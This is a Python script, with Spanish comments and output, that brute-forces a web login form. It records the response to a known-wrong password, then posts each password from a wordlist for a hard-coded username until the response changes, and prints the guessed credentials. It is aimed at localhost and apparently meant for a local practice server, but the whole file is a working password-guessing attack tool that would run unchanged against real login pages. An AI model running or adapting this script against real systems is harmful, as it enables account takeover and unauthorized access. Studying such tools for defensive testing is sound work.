import sys

import requests

URL = "http://127.0.0.1:8000/login"
CAMPO_USUARIO = "u"
CAMPO_PASS = "password"

USUARIOS = [
    "51066056",
]

WORDLIST = "passwords.txt"


def respuesta(usuario, password):
    try:
        return requests.post(
            URL,
            data={CAMPO_USUARIO: usuario, CAMPO_PASS: password},
            timeout=5,
        )
    except requests.exceptions.ConnectionError:
        print(f"[error] no me puedo conectar a {URL} -- esta levantado tu server?")
        sys.exit(1)


def firma(r):
    return (r.status_code, len(r.text), r.url, tuple(sorted(r.cookies.keys())))


def baseline(usuario):
    r = respuesta(usuario, "ESTO_SEGURO_ESTA_MAL_9z7xQ")
    return firma(r)


def cargar_passwords():
    with open(WORDLIST, encoding="latin-1") as f:
        return [linea.strip() for linea in f if linea.strip()]


def buscar(usuario, passwords, base):
    total = len(passwords)
    for i, pw in enumerate(passwords, 1):
        r = respuesta(usuario, pw)
        print(f"  [{i}/{total}] probando: {pw!r}")
        if firma(r) != base:
            return pw, i
    return None, total


def main():
    passwords = cargar_passwords()
    print(f"[cliente] cargadas {len(passwords)} contrasenas de '{WORDLIST}'\n")

    encontrados = {}
    for usuario in USUARIOS:
        print(f"[cliente] usuario {usuario}")
        base = baseline(usuario)
        print(f"[cliente] huella de login INCORRECTO: {base}")
        pw, intentos = buscar(usuario, passwords, base)
        if pw is not None:
            print(f"\n   >>> ADIVINADA en {intentos} intentos  ->  usuario: {usuario}   contrasena: {pw}\n")
            encontrados[usuario] = pw
        else:
            print(f"\n   ...no estaba en la lista para {usuario}\n")

    print("==================== RESULTADO ====================")
    if encontrados:
        for usuario, pw in encontrados.items():
            print(f"  usuario: {usuario}   contrasena: {pw}")
    else:
        print("  no se adivino ninguna contrasena")
    print("==================================================")


if __name__ == "__main__":
    main()
    input("\nPresiona Enter para salir...")
